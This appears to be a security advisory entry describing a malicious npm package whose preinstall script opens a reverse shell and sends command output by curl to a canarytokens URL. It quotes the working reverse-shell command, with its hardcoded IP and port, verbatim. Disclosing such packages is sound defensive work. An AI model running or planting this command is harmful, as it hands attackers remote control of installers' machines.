  "summary": "preinstall reverse shell to hardcoded IP with stdout exfiltration",
  "details": "package.json declares a preinstall script that executes on npm install and runs `bash -i >& /dev/tcp/147.93.157.202/8080`, opening an interactive reverse shell from the installer's host to the hardcoded remote endpoint 147.93.157.202:8080. The same command pipes shell stdout/stderr via curl POST (plain HTTP) to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php. Installing this package grants an external party interactive command execution on the installer's machine at install time and leaks command output to a remote URL.",
